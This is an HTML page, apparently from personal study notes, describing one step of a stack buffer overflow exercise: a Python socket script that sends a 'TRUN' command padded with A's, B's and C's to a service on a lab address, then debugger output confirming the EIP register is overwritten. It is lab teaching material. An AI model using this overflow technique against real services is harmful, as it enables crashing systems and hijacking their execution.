<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Overwrite the EIP</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Overwrite the EIP</h1><br/>To make sure we have the correct offset to the EIP register we will modify the python script once again. <br />Since we know the offset of EIP we want to make sure we can control the data within. <br /><span style="text-decoration:underline;">To verify if the offset is correct we will see if we can put four B’s (42424242) in the EIP register</span>. <br />For good measure and clarity, we will pad the buffer variable with some C characters to clearly demonstrate and visually see how the buffer is affected, and controlled by our script. This will be represented in memory within Immunity Debugger. The buffer variable is modified to include 2003 A’s then 4 B’s and 80 C’s. <br /><br />Change the value of <br />• eip_address_location with the value found in the chapter “Find the Offset”<br />• s.connect with address and port of the service<br />• s.send with the value of the command of the service<br /><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">#!/usr/bin/python</span><br />import socket<br />import sys<br />from time import <span style="color:#ff9d00;font-weight:700">sleep</span><br /><br />eip_address_location = 2003<br />buffer = <span style="color:#3ad900;font-weight:400">&#39;A&#39;</span> * eip_address_location + <span style="color:#3ad900;font-weight:400">&#39;B&#39;</span> * 4 + <span style="color:#3ad900;font-weight:400">&#39;C&#39;</span> * 80<br /><br />try<span style="color:#ff9d00;font-weight:700">:</span><br />  <span style="color:#7f0044;font-weight:400">s</span>=socket.socket<span style="color:#ff9d00;font-weight:700">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#ff9d00;font-weight:700">)</span><br />  s.settimeout<span style="color:#ff9d00;font-weight:700">(</span>2<span style="color:#ff9d00;font-weight:700">)</span><br />  s.connect<span style="color:#ff9d00;font-weight:700">((</span><span style="color:#3ad900;font-weight:400">&#39;192.168.1.118&#39;</span>,9999<span style="color:#ff9d00;font-weight:700">))</span><br />  s.recv<span style="color:#ff9d00;font-weight:700">(</span>1024<span style="color:#ff9d00;font-weight:700">)</span><br />  <br />  print <span style="color:#3ad900;font-weight:400">&#39;[*] Sending buffer.&#39;</span><br />  s.send<span style="color:#ff9d00;font-weight:700">(</span><span style="color:#3ad900;font-weight:400">&#39;TRUN /.:/&#39;</span> + buffer + <span style="color:#3ad900;font-weight:400">&#39;\r\n&#39;</span><span style="color:#ff9d00;font-weight:700">)</span>                <span style="color:#0088ff;font-weight:400">#target the TRUN command</span><br />  s.<span style="color:#ffdd00;font-weight:400">close()</span><br />  <br />except<span style="color:#ff9d00;font-weight:700">:</span><br />  print <span style="color:#3ad900;font-weight:400">&#39;[*] Could not connect to target, exiting.&#39;</span><br />  sys.<span style="color:#ffdd00;font-weight:400">exit()</span></pre></div><br /><br /><a href=""><img src="images/2138-1.png" alt="images/2138-1.png" /></a><br /><br /><br />• EBP register is filled with 41414141 which represent our four A’s in hexadecimal format<br />•<span style="text-decoration:underline;"> EIP register</span> is filled with 42424242 which represent our four B’s in hexadecimal format<br />• ESP register is filled with C&#39;s<br /><br />Here we have a clean transition from A&#39;s (EBP) to the four B&#39;s (EIP) and continuing with C&#39;s (ESP). This mean we have a good control of the EIP register and memory.<br /><br /><br /></div>
</body>
</html>
